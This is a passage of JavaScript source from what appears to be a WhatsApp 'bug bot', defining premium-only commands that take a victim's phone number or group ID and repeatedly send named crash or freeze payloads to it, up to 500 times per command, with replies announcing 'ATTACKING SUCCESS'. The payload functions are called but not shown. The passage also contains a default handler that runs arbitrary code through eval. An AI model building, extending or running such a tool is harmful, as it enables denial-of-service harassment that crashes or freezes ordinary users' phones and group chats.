        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗱𝗼𝗰𝗧𝗵𝘂𝗺𝗯\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await docThumb(prim, target);
}
}
break;

case 'frz-sql': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗶𝗻𝘃𝗶𝘀𝗦𝗾𝗟²\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await invisSqL2(prim, target);
}
}
break;

// delay

case 'delay-ofm': case 'delay-csl': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗼𝗳𝗺𝗰𝗿𝘀𝗹\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await ofmcrsl(prim, target);
}
}
break;

case 'delay-sql': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗼𝗳𝗺𝗖𝗿𝗮𝘀𝗵𝗦𝗾𝗹\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await ofmCrashSql(prim, target);
}
}
break;

case 'delay-vcs': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝘃𝗰𝘀\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await vcs(prim, target);
}
}
break;

// ios case

case 'ios-zk': case 'rpmn-ios': case 'crash-ios': case 'invis-ios': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
            `*— 𝚄𝚂𝙰𝙶𝙴: ${prefix+command} 509xxx*\n` +
            `*𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*\n\n` +
            `_*𝚃𝙷𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙼𝚄𝚂𝚃 𝙲𝙾𝙽𝚃𝙰𝙸𝙽 𝙳𝙸𝙶𝙸𝚃𝚂 𝙾𝙽𝙻𝚈.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— ${number || '𝙴𝙼𝙿𝚃𝚈'} 𝙸𝚂 𝚃𝙾𝙾 𝚂𝙷𝙾𝚁𝚃.*\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 10+ 𝙳𝙸𝙶𝙸𝚃 𝙽𝚄𝙼𝙱𝙴𝚁.*\n\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n` +
        `𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}\n` +
        `𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗳𝗿𝗲𝘇𝗰𝗿𝗮𝘀𝗵𝗫𝗰𝘅\n\n` +
        `*» 𝙰𝙵𝚃𝙴𝚁 𝚈𝙾𝚄 𝚂𝙴𝙽𝙳 𝚃𝙷𝙴 𝚅𝙸𝚃𝚄𝚂, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃 10 𝙼𝙸𝙽𝚄𝚃𝙴𝚂 𝙱𝙴𝙵𝙾𝚁𝙴 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙰𝙽𝙾𝚃𝙷𝙴𝚁.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await iosZLoc(prim, target)
}
}
break;

case 'kill-gc': case 'bug-gc': case 'blank-gc': case 'cool-gc': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝚁𝙴𝚂𝚃𝚁𝙸𝙲𝚃𝙴𝙳.*\n\n` +
        `*— 𝙾𝙽𝙻𝚈 𝚃𝙷𝙴 𝙱𝙾𝚃 𝙾𝚆𝙽𝙴𝚁 𝙲𝙰𝙽 𝚄𝚂𝙴 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳.*`
    );
    if (!q) return reply(
        `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝚄𝚂𝙰𝙶𝙴.*\n\n` +
        `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 120363123456789@g.us*\n\n` +
        `*— 𝚃𝙾 𝙶𝙴𝚃 𝚃𝙷𝙴 𝙹𝙸𝙳 𝙾𝙵 𝙰 𝙶𝚁𝙾𝚄𝙿, 𝚃𝚈𝙿𝙴 .jid 𝙾𝙽 𝚃𝙷𝙴 𝙶𝚁𝙾𝚄𝙿.*`
    );

    if (q.includes('chat.whatsapp.com/') || q.includes('https://') || q.includes('http://')) {
        return reply(
            `*❌ 𝙻𝙸𝙽𝙺 𝙽𝙾𝚃 𝚂𝚄𝙿𝙿𝙾𝚁𝚃𝙴𝙳.*\n\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝚄𝚂𝙴 𝚃𝙷𝙴 𝙶𝚁𝙾𝚄𝙿'𝚂 𝙹𝙸𝙳 𝙸𝙽𝚂𝚃𝙴𝙰𝙳.*\n` +
            `*— 𝙴𝚇𝙰𝙼𝙿𝙻𝙴: ${prefix+command} 120363123456789@g.us*\n\n` +
            `*— 𝚃𝙾 𝙶𝙴𝚃 𝚃𝙷𝙴 𝙹𝙸𝙳, 𝚃𝚈𝙿𝙴 .jid 𝙸𝙽 𝚃𝙷𝙴 𝙶𝚁𝙾𝚄𝙿.*`
        );
    }

    let target = args[0];
    if (!target) return reply(
        `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳.*\n\n` +
        `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 𝙶𝚁𝙾𝚄𝙿'𝚂 𝙹𝙸𝙳.*`
    );

    if (!target.includes('@g.us')) {
        return reply(
            `*❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙵𝙾𝚁𝙼𝙰𝚃.*\n\n` +
            `*— 𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚁𝙾𝚅𝙸𝙳𝙴 𝙰 𝚅𝙰𝙻𝙸𝙳 𝙶𝚁𝙾𝚄𝙿 𝙹𝙸𝙳 (𝚎.𝚐. 120363123456789@g.us)*`
        );
    }

    try {
        for (let i = 0; i < 50; i++) {
            await coolz4ndroz(prim, target);
        }
        reply(
            `*✅ 𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝚂𝙴𝙽𝚃 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿:* ${target}`
        );
    } catch (err) {
        reply(
            `*❌ 𝙵𝙰𝙸𝙻𝙴𝙳.*\n\n` +
            `*— 𝙼𝙰𝙺𝙴 𝚂𝚄𝚁𝙴 𝚃𝙷𝙴 𝙱𝙾𝚃 𝙸𝚂 𝙸𝙽 𝚃𝙷𝙴 𝙶𝚁𝙾𝚄𝙿.*`
        );
    }
}
break;

default:
  if (budy.startsWith('^')) {
  if (!isBot) return;
  try {
    let evaled = await eval(budy.slice(2));
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
      reply(evaled);
    } catch (err) {
      reply(String(err));
    }
  }
  break;

}
  } catch (err) {
    console.log(require("util").format(err));
  }
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});
